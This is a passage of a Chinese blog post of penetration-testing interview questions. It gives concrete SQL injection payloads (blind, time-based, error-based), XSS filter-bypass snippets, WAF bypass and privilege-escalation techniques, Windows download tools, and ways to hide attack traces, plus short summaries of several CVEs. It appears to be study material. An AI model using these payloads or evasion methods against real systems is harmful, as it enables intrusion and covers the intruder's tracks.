+<h3 id="问：WAF-绕过"><a href="#问：WAF-绕过" class="headerlink" title="问：WAF 绕过"></a>问：WAF 绕过</h3><p>答：</p>
+<blockquote>
+<p>1 注释替换空格 </p>
+<p>2 字符集绕过</p>
+<p>3 chunked绕过</p>
+<p>4 上传请求 multipart 绕过</p>
+<p>5.参数污染</p>
+<p>。。。</p>
+</blockquote>
+<h3 id="问：SQL注入构造payload"><a href="#问：SQL注入构造payload" class="headerlink" title="问：SQL注入构造payload"></a>问：SQL注入构造payload</h3><p>答：</p>
+<p>一、布尔型盲注</p>
+<p>(1)mysql :</p>
+<p>‘and (length(database()))&gt;10 –+</p>
+<p>(2)oracle:</p>
+<p>‘ and 1&#x3D;(select decode(user,’SCOTT’,1,0) from dual) –</p>
+<p>二、时间型盲注</p>
+<p>and if(ascii(substr((select database()),1,1))&gt;115,1,sleep(5))</p>
+<p>三、利用报错回显</p>
+<p>(1) extractvalue</p>
+<p>and extractvalue(1,concat(0x7e,(select database())))</p>
+<p>(2) updatexml</p>
+<p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</p>
+<h3 id="问：UDF提权原理"><a href="#问：UDF提权原理" class="headerlink" title="问：UDF提权原理"></a>问：UDF提权原理</h3><p>答：利用了root 高权限，创建带有调用cmd的函数的udf.dll动态链接库，导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd</p>
+<h3 id="问：提权方式"><a href="#问：提权方式" class="headerlink" title="问：提权方式"></a>问：提权方式</h3><p>答：</p>
+<p>windows:</p>
+<blockquote>
+<p>1.systminfo ,根据系统补丁提权</p>
+<p>2.第三方服务提权</p>
+<p>3.数据库提权</p>
+<p>。。。</p>
+</blockquote>
+<p>linux:</p>
+<blockquote>
+<p>1.利用系统内核漏洞进行提权 </p>
+<p>2.泄漏密码提权</p>
+<p>3.sudo提权</p>
+<p>4.SUID提权</p>
+<p>。。。</p>
+</blockquote>
+<h3 id="问：XSS弹窗函数及常见的-XSS-绕过策略"><a href="#问：XSS弹窗函数及常见的-XSS-绕过策略" class="headerlink" title="问：XSS弹窗函数及常见的 XSS 绕过策略"></a><strong>问：XSS弹窗函数及常见的 XSS 绕过策略</strong></h3><p>答：</p>
+<p>一、alert,confirm,prompt三种函数</p>
+<p>二、绕过策略</p>
+<blockquote>
+<p>\1. 大小写混合</p>
+<p>\2. 双写</p>
+<p>3.编码</p>
+<p>\4. fuzz 低频使用标签 &lt;details&#x2F;open&#x2F;ontoggle&gt;</p>
+<p>\5. fuzz 低频使用函数 ontoggle 等</p>
+<p>6.&lt;img&#x2F;src&#x3D;1&gt;</p>
+<p>7.%0a或者%0d绕过</p>
+</blockquote>
+<h3 id="问：Windows-cmd-如何下载文件"><a href="#问：Windows-cmd-如何下载文件" class="headerlink" title="问：Windows cmd 如何下载文件"></a>问：Windows cmd 如何下载文件</h3><p>答：</p>
+<blockquote>
+<p>1.certutil.exe</p>
+<p>2.powershell</p>
+<p>3.bitsadmin</p>
+<p>4.vbs</p>
+<p>5.ftp</p>
+</blockquote>
+<h3 id="问：SVN-x2F-GIT源代码泄露"><a href="#问：SVN-x2F-GIT源代码泄露" class="headerlink" title="问：SVN&#x2F;GIT源代码泄露"></a><strong>问：SVN&#x2F;GIT源代码泄露</strong></h3><p>答：</p>
+<blockquote>
+<p>（1）在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息</p>
+<p>&#x2F;.git&#x2F;config</p>
+<p>（2）使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞</p>
+<p>&#x2F;.svn&#x2F;entries</p>
+</blockquote>
+<h3 id="问：reverse-tcp-和-bind-tcp-的区别"><a href="#问：reverse-tcp-和-bind-tcp-的区别" class="headerlink" title="问：reverse_tcp 和 bind_tcp 的区别"></a>问：reverse_tcp 和 bind_tcp 的区别</h3><p>答：</p>
+<p>（1）reverse_tcp</p>
+<p>木马会主动连接目标服务器</p>
+<p>（2）bind_tcp</p>
+<p>木马会监听本地的端口</p>
+<h3 id="什么是fastjson-有哪些漏洞？"><a href="#什么是fastjson-有哪些漏洞？" class="headerlink" title="什么是fastjson,有哪些漏洞？"></a>什么是fastjson,有哪些漏洞？</h3><p>答：</p>
+<p>（1）Fastjson是Alibaba开发的Java语言编写的高性能JSON库</p>
+<p>（2）攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE</p>
+<p>（3）fastjson漏洞历史</p>
+<p>1.fastjson-1.2.24</p>
+<p>(fastjson接受的JSON可以通过艾特type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作)</p>
+<p>2.fastjson-1.248以下</p>
+<p>(checkAutoType中使用TypeUtils.getClassFromMapping(typeName)去获取class不为空，从而绕过了黑名单检测)</p>
+<p>3.fastjson-1.2.60以下</p>
+<p>(在此版本以下，字符串中包含\x转义字符时可以造成dos漏洞)</p>
+<h3 id="问：隐藏攻击痕迹的方法"><a href="#问：隐藏攻击痕迹的方法" class="headerlink" title="问：隐藏攻击痕迹的方法"></a>问：隐藏攻击痕迹的方法</h3><p>答：</p>
+<blockquote>
+<p>1.跳板</p>
+<p>2.代理服务器</p>
+<p>3.Tor</p>
+<p>4.日志</p>
+<p>5.清除历史记录</p>
+<p>6.粉碎文件</p>
+</blockquote>
+<h2 id="理解漏洞"><a href="#理解漏洞" class="headerlink" title="理解漏洞"></a>理解漏洞</h2><p>讲诉一些近期及有代表性的漏洞</p>
+<h3 id="Microsoft-Exchange-Net反序列化远程代码执行-CVE-2020-0688"><a href="#Microsoft-Exchange-Net反序列化远程代码执行-CVE-2020-0688" class="headerlink" title="Microsoft Exchange .Net反序列化远程代码执行(CVE-2020-0688)"></a>Microsoft Exchange .Net反序列化远程代码执行(CVE-2020-0688)</h3><p>该漏洞是由于Exchange控制面板（ECP）组件中使用了静态密钥validationKey和decryptionKey</p>
+<h3 id="Apache-Tomcat-文件包含漏洞-CVE-2020-1938"><a href="#Apache-Tomcat-文件包含漏洞-CVE-2020-1938" class="headerlink" title="Apache Tomcat 文件包含漏洞(CVE-2020-1938)"></a>Apache Tomcat 文件包含漏洞(CVE-2020-1938)</h3><p>默认情况下,Tomcat会开启AJP连接器, Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的请求,可以读取或者包含Web根目录下的任意文件,配合文件上传，将导致任意代码执行(RCE)</p>
+<h3 id="Weblogic-IIOP反序列化漏洞（CVE-2020-2551）"><a href="#Weblogic-IIOP反序列化漏洞（CVE-2020-2551）" class="headerlink" title="Weblogic IIOP反序列化漏洞（CVE-2020-2551）"></a>Weblogic IIOP反序列化漏洞（CVE-2020-2551）</h3><p>weblogic核心组件中IIOP协议，通过该协议对存在漏洞的WebLogic进行远程代码执行的攻击</p>
+<h3 id="Apache-Solr远程代码执行（CVE-2019-12409）"><a href="#Apache-Solr远程代码执行（CVE-2019-12409）" class="headerlink" title="Apache Solr远程代码执行（CVE-2019-12409）"></a>Apache Solr远程代码执行（CVE-2019-12409）</h3><p>默认配置文件solr.in.sh,在其配置文件中ENABLE_REMOTE_JMX_OPTS字段默认配置不安全.如果使用默认配置,将启用JMX监视服务并将对公网监听18983的RMI端口,无需任何验证,配合JMX RMI远程代码执行</p>
+<h3 id="SHIRO-550-反序列化漏洞"><a href="#SHIRO-550-反序列化漏洞" class="headerlink" title="SHIRO-550 反序列化漏洞"></a>SHIRO-550 反序列化漏洞</h3><p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：</p>
+<p>得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化</p>
+<p>AES的密钥是硬编码在代码里，就导致了反序列化的RCE漏洞</p>
+<h3 id="SHIRO-721反序列化漏洞"><a href="#SHIRO-721反序列化漏洞" class="headerlink" title="SHIRO-721反序列化漏洞"></a>SHIRO-721反序列化漏洞</h3><p>不需要key，利用Padding Oracle Attack构造出RememberMe字段后段的值结合合法的RememberMe cookie即可完成攻击</p>
+<h3 id="泛微Ecology-OA-SQL注入漏洞"><a href="#泛微Ecology-OA-SQL注入漏洞" class="headerlink" title="泛微Ecology OA SQL注入漏洞"></a>泛微Ecology OA SQL注入漏洞</h3><p>validate.jsp接口的SQL注入，&#x2F;cpt&#x2F;manage&#x2F;validate.jsp</p>
+<h3 id="泛微ecology-OA系统接口存在数据库配置信息泄露"><a href="#泛微ecology-OA系统接口存在数据库配置信息泄露" class="headerlink" title="泛微ecology OA系统接口存在数据库配置信息泄露"></a>泛微ecology OA系统接口存在数据库配置信息泄露</h3><p>&#x2F;mobile&#x2F;dbconfigreader.jsp,直接访问该页面将为DES加密以后的乱码,使用DES算法结合硬编码的key进行解密</p>
+<h3 id="Confluence本地文件泄露漏洞-CVE-2019-3394"><a href="#Confluence本地文件泄露漏洞-CVE-2019-3394" class="headerlink" title="Confluence本地文件泄露漏洞(CVE-2019-3394)"></a>Confluence本地文件泄露漏洞(CVE-2019-3394)</h3><p>catalina.jar中的org.apache.catalina.webresources.StandardRoot.class的getResource方法的validate存在过滤和限制，所以可遍历路径均在&#x2F;WEB-INF下</p>
+<h3 id="Apache-Dubbo反序列化漏洞（CVE-2019-17564）"><a href="#Apache-Dubbo反序列化漏洞（CVE-2019-17564）" class="headerlink" title="Apache Dubbo反序列化漏洞（CVE-2019-17564）"></a>Apache Dubbo反序列化漏洞（CVE-2019-17564）</h3><p>当HTTP remoting 开启的时候，存在反序列化漏洞</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">XiongTaoTao</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2020/03/24/%E6%B8%97%E9%80%8F%E9%9D%A2%E8%AF%95%E9%A2%98/">http://example.com/2020/03/24/%E6%B8%97%E9%80%8F%E9%9D%A2%E8%AF%95%E9%A2%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">技术阿涛</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-meta__tags" href="/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/">面试题</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/03/24/3.24/" title="3-24"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">3-24</div></div></a></div><div class="next-post pull-right"><a href="/2020/03/23/3.23/" title="3-23"><img class="cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">3-23</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">XiongTaoTao</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">45</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B2%97%E4%BD%8D%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">岗位分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98%E5%8F%8A%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">常见面试题及参考</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9AMySQL%E5%86%99WebShell%E6%9C%89%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%EF%BC%8C%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">问：MySQL写WebShell有几种方式，利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9ASql-%E6%B3%A8%E5%85%A5%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%88%A9%E7%94%A8-DNSlog%EF%BC%8Cmysql-%E4%B8%8B%E5%88%A9%E7%94%A8%E4%BB%80%E4%B9%88%E6%9E%84%E9%80%A0%E4%BB%A3%E7%A0%81%EF%BC%8Cmssql-%E4%B8%8B%E5%8F%88%E5%A6%82%E4%BD%95%EF%BC%9F"><span class="toc-number">3.2.</span> <span class="toc-text">问：Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9Aphpmyadmin%E5%86%99sehll%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">3.3.</span> <span class="toc-text">问：phpmyadmin写sehll的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">3.4.</span> <span class="toc-text">问：权限维持的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9AXXE-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A6%82%E4%BD%95%E5%AF%BB%E6%89%BE%EF%BC%9F"><span class="toc-number">3.5.</span> <span class="toc-text">问：XXE 漏洞原理，代码审计如何寻找？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9ASSRF-%E7%A6%81%E7%94%A8-127-0-0-1-%E5%90%8E%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%EF%BC%8C%E6%94%AF%E6%8C%81%E5%93%AA%E4%BA%9B%E5%8D%8F%E8%AE%AE%EF%BC%9F"><span class="toc-number">3.6.</span> <span class="toc-text">问：SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9A%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A6%82%E4%BD%95%E6%9F%A5%E6%89%BE%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%8C%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E8%BF%9B%E7%A8%8B%E6%89%BE%E5%88%B0%E6%8C%96%E7%9F%BF%E6%96%87%E4%BB%B6"><span class="toc-number">3.7.</span> <span class="toc-text">问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9Astruts2%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.8.</span> <span class="toc-text">问：struts2框架漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9AJAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86"><span class="toc-number">3.9.</span> <span class="toc-text">问：JAVA反序列化原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9Acors%E5%A6%82%E4%BD%95%E4%BA%A7%E7%94%9F%EF%BC%8C%E6%9C%89%E5%93%AA%E4%BA%9B%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9F%E7%BB%95%E8%BF%87%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E7%9A%84%E6%96%B9%E6%B3%95%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9Fjsonp%E8%B7%A8%E5%9F%9F%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%EF%BC%9F"><span class="toc-number">3.10.</span> <span class="toc-text">问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9Aphar%E5%8D%8F%E8%AE%AE%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%EF%BC%8Cphp%E4%BC%AA%E5%8D%8F%E8%AE%AEinput%E4%B8%8Epost%E6%95%B0%E6%8D%AE%E5%8C%85%E5%8F%91%E9%80%81%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">3.11.</span> <span class="toc-text">问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9A%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.12.</span> <span class="toc-text">问：内网服务器，如何进行信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%94%EF%BC%9A"><span class="toc-number">3.13.</span> <span class="toc-text">答：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9A%E5%86%85%E7%BD%91%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E3%80%81%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.14.</span> <span class="toc-text">问：内网黄金票据、白银票据的区别和利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9Adocker%E8%BF%9C%E7%A8%8Bapi%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.15.</span> <span class="toc-text">问：docker远程api漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9Assrf%E6%80%8E%E4%B9%88%E7%94%A8redis%E5%86%99shell"><span class="toc-number">3.16.</span> <span class="toc-text">问：ssrf怎么用redis写shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9A%E9%A2%84%E7%BC%96%E8%AF%91%E8%83%BD%E5%90%A6100-%E9%98%B2sql%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%B8%8D%E8%83%BD%EF%BC%8C%E5%86%99%E4%B8%80%E4%B8%AA"><span class="toc-number">3.17.</span> <span class="toc-text">问：预编译能否100%防sql注入，如果不能，写一个</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9AWAF-%E7%BB%95%E8%BF%87"><span class="toc-number">3.18.</span> <span class="toc-text">问：WAF 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E6%9E%84%E9%80%A0payload"><span class="toc-number">3.19.</span> <span class="toc-text">问：SQL注入构造payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9AUDF%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86"><span class="toc-number">3.20.</span> <span class="toc-text">问：UDF提权原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9A%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F"><span class="toc-number">3.21.</span> <span class="toc-text">问：提权方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9AXSS%E5%BC%B9%E7%AA%97%E5%87%BD%E6%95%B0%E5%8F%8A%E5%B8%B8%E8%A7%81%E7%9A%84-XSS-%E7%BB%95%E8%BF%87%E7%AD%96%E7%95%A5"><span class="toc-number">3.22.</span> <span class="toc-text">问：XSS弹窗函数及常见的 XSS 绕过策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9AWindows-cmd-%E5%A6%82%E4%BD%95%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">3.23.</span> <span class="toc-text">问：Windows cmd 如何下载文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9ASVN-x2F-GIT%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">3.24.</span> <span class="toc-text">问：SVN&#x2F;GIT源代码泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9Areverse-tcp-%E5%92%8C-bind-tcp-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">3.25.</span> <span class="toc-text">问：reverse_tcp 和 bind_tcp 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFfastjson-%E6%9C%89%E5%93%AA%E4%BA%9B%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">3.26.</span> <span class="toc-text">什么是fastjson,有哪些漏洞？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%EF%BC%9A%E9%9A%90%E8%97%8F%E6%94%BB%E5%87%BB%E7%97%95%E8%BF%B9%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">3.27.</span> <span class="toc-text">问：隐藏攻击痕迹的方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">理解漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Microsoft-Exchange-Net%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2020-0688"><span class="toc-number">4.1.</span> <span class="toc-text">Microsoft Exchange .Net反序列化远程代码执行(CVE-2020-0688)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Tomcat-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2020-1938"><span class="toc-number">4.2.</span> <span class="toc-text">Apache Tomcat 文件包含漏洞(CVE-2020-1938)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weblogic-IIOP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-2551%EF%BC%89"><span class="toc-number">4.3.</span> <span class="toc-text">Weblogic IIOP反序列化漏洞（CVE-2020-2551）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Solr%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2019-12409%EF%BC%89"><span class="toc-number">4.4.</span> <span class="toc-text">Apache Solr远程代码执行（CVE-2019-12409）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SHIRO-550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.5.</span> <span class="toc-text">SHIRO-550 反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SHIRO-721%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.6.</span> <span class="toc-text">SHIRO-721反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEEcology-OA-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.7.</span> <span class="toc-text">泛微Ecology OA SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEecology-OA%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">4.8.</span> <span class="toc-text">泛微ecology OA系统接口存在数据库配置信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Confluence%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2019-3394"><span class="toc-number">4.9.</span> <span class="toc-text">Confluence本地文件泄露漏洞(CVE-2019-3394)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89"><span class="toc-number">4.10.</span> <span class="toc-text">Apache Dubbo反序列化漏洞（CVE-2019-17564）</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/03/10/3-10/" title="3.1"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="3.1"/></a><div class="content"><a class="title" href="/2023/03/10/3-10/" title="3.1">3.1</a><time datetime="2023-03-10T12:01:33.000Z" title="发表于 2023-03-10 20:01:33">2023-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/10/restart/" title="restart"><img src="http://rraza0lac.hn-bkt.clouddn.com/img/image-20230310201154080.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="restart"/></a><div class="content"><a class="title" href="/2023/03/10/restart/" title="restart">restart</a><time datetime="2023-03-10T11:43:42.000Z" title="发表于 2023-03-10 19:43:42">2023-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/03/24/3.24/" title="3-24"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="3-24"/></a><div class="content"><a class="title" href="/2020/03/24/3.24/" title="3-24">3-24</a><time datetime="2020-03-24T01:37:52.000Z" title="发表于 2020-03-24 09:37:52">2020-03-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/03/24/%E6%B8%97%E9%80%8F%E9%9D%A2%E8%AF%95%E9%A2%98/" title="渗透面试题"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="渗透面试题"/></a><div class="content"><a class="title" href="/2020/03/24/%E6%B8%97%E9%80%8F%E9%9D%A2%E8%AF%95%E9%A2%98/" title="渗透面试题">渗透面试题</a><time datetime="2020-03-24T01:37:52.000Z" title="发表于 2020-03-24 09:37:52">2020-03-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/03/23/3.23/" title="3-23"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="3-23"/></a><div class="content"><a class="title" href="/2020/03/23/3.23/" title="3-23">3-23</a><time datetime="2020-03-23T01:55:34.000Z" title="发表于 2020-03-23 09:55:34">2020-03-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By XiongTaoTao</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" 